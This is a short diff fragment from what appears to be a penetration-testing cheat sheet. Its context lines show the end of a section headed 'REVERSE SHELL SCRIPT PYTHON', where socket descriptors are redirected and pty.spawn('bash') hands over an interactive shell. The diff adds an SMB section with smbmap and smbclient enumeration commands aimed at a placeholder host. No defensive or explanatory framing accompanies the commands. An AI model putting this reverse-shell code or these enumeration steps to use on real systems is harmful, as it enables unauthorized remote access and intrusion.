@@ -61,3 +61,10 @@ REVERSE SHELL SCRIPT PYTHON
 	os.dup2(s.fileno(),2)
 	import pty
 	pty.spawn("bash")
+
+
+SMB
+smbmap -H HOST
+ smbclient \\\\\\\\HOST\\\
+ 
+ 
